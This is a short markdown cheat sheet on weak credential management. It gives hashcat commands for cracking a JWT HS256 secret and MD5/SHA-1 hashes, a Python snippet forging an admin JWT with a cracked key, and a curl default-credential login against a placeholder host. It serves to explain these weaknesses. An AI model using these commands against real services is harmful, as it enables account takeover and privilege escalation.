# Weak Credential Management

## Table of Contents
- [Known or Guessable Secrets](#known-or-guessable-secrets)
- [Weak Encryption of Secrets](#weak-encryption-of-secrets)

## Known or Guessable Secrets

### Using secrets that are easily guessed or commonly found in wordlists can compromise the entire service.

- Compromises in authentication systems
  1. JWT (HS256) secret key crack
      ```bash
      hashcat -m 16500 -a 0 hash.txt rockyou.txt
      ```
  2. Creating a forged JWT
      ```python
      import jwt
      
      secret_key = "secret123" #secret key cracked with hashcat
      
      payload = {
          "sub": "user_123",
          "role": "admin"
      }
      
      token = jwt.encode(payload, secret_key, algorithm="HS256")
      print(f"Generated JWT: {token}")
      ```
   
- Easily guessable admin credentials
   ```bash
   curl -X POST -d "username=admin&password=admin" https://[VULNERABLE-SERVICE]/login
   ```

## Weak Encryption of Secrets

### Using weak encryption algorithms enables faster decryption, potentially leading to further attacks. (e.g., credential stuffing)

- Cracking MD5 or SHA-1 hashed passwords
   ```bash
   hashcat -m 0 -a 0 hash.txt wordlist.txt
   ```
